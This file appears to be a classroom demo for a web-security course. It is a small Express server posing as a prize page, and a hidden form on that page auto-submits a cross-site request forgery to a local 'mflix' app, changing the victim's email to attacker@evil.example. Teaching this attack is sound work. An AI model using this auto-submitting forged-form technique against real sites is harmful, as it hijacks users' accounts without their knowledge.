// The attacker's site, on port 3002. It knows nothing about you: no password, no cookie.
// It only knows what mflix's "change email" form looks like (anyone can View Source).
// Run:  docker compose exec node node week11/class1/01_csrf/evil.js
//
// Open it two ways, while logged in to http://localhost:3001 in the same browser:
//   http://localhost:3002    same site as the victim (only the port differs)
//   http://127.0.0.1:3002    a different site

const express = require('express');
const app = express();

// No helmet, no CSP: the attacker is happy to run inline scripts on their own page.
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>You won!</title></head>
<body style="font-family: sans-serif; text-align: center; margin-top: 4rem">
  <h1>&#127871; You won a free movie night!</h1>
  <p>Hold on, we're loading your prize...</p>

  <!-- The whole attack: a copy of mflix's form, pointed at mflix, submitted by script. -->
  <form id="prize" method="POST" action="http://localhost:3001/email">
    <input type="hidden" name="email" value="attacker@evil.example">
  </form>
  <script>
    setTimeout(() => document.getElementById('prize').submit(), 1500);
  </script>
</body>
</html>`);
});

app.listen(3002, () => console.log('Evil site on http://localhost:3002 and http://127.0.0.1:3002'));
